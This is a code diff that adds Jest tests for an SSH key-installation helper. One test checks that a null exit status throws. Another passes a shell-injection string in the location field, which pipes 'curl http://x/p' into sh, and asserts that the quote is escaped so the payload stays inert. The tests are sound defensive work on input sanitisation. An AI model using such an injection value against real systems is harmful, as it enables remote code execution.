@@ -67,4 +67,18 @@ describe("addKeyToHost", () => {
     sshExecCommand.mockResolvedValueOnce({ stdout: "", stderr: "", exit_code: 0 } as never);
     await expect(addKeyToHost({ sshKey, connection })).resolves.toBeUndefined();
   });
+
+  it("throws when the remote never reports an exit status", async () => {
+    sshExecCommand.mockResolvedValueOnce({ stdout: "", stderr: "", exit_code: null } as never);
+    await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
+  });
+
+  it("neutralises a single quote in location instead of letting it close the shell string", async () => {
+    await addKeyToHost({ sshKey, connection, location: ".ssh'; curl http://x/p | sh; echo '" });
+    const { command } = sshExecCommand.mock.calls[0][0] as any;
+    // Each embedded quote is escaped (close-quote, escaped quote, reopen-quote)
+    // rather than closing the argument, so the whole payload stays inside one
+    // shell-quoted string instead of becoming a second command.
+    expect(command).toContain("'.ssh'\\''; curl http://x/p | sh; echo '\\'''");
+  });
 });
